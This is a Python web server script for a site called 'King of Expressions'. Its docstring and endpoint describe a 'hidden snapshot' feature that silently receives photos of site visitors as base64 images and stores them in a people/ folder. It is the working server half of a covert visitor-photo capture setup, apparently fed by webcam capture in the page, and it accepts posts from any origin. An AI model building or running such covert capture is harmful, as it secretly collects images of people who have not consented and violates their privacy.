#!/usr/bin/env python3
"""
King of Expressions Web Server with Server-Side Hidden Snapshot Support.
Serves static web files and saves incoming visitor photos silently into the people/ folder.
Zero external dependencies required (uses built-in Python standard library).
"""

import http.server
import socketserver
import os
import json
import base64
from datetime import datetime

PORT = 8000
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
PEOPLE_DIR = os.path.join(BASE_DIR, "people")
os.makedirs(PEOPLE_DIR, exist_ok=True)

class SnapServerHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=BASE_DIR, **kwargs)

    def do_POST(self):
        if self.path in ("/api/save-snap", "/save-snap"):
            content_length = int(self.headers.get("Content-Length", 0))
            post_data = self.rfile.read(content_length)
            try:
                payload = json.loads(post_data.decode("utf-8"))
                img_data = payload.get("image", "")
                filename = payload.get("filename")
                if not filename:
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    filename = f"person_{timestamp}.jpg"

                # Sanitize filename
                filename = os.path.basename(filename)

                if "," in img_data:
                    img_data = img_data.split(",", 1)[1]

                raw_bytes = base64.b64decode(img_data)
                filepath = os.path.join(PEOPLE_DIR, filename)

                with open(filepath, "wb") as f:
                    f.write(raw_bytes)

                print(f"\n[PHOTO SAVED] Captured screenshot stored: people/{filename}\n", flush=True)
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_header("Access-Control-Allow-Origin", "*")
                self.end_headers()
                self.wfile.write(b'{"status":"saved"}')
                return
            except Exception as err:
                print(f"[SNAPSHOT ERROR] {err}", flush=True)
                self.send_response(500)
                self.send_header("Access-Control-Allow-Origin", "*")
                self.end_headers()
                self.wfile.write(str(err).encode("utf-8"))
                return

        self.send_error(404, "Endpoint not found")

if __name__ == "__main__":
    socketserver.TCPServer.allow_reuse_address = True
    port = PORT
    try:
        httpd = socketserver.TCPServer(("", port), SnapServerHandler)
    except OSError:
        port = 8001
        httpd = socketserver.TCPServer(("", port), SnapServerHandler)

    print(f"\n========================================================")
    print(f" King of Expressions Server Running")
    print(f" Web URL: http://localhost:{port}")
    print(f" Photos will be stored in: {PEOPLE_DIR}")
    print(f"========================================================\n")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\nStopping server.")
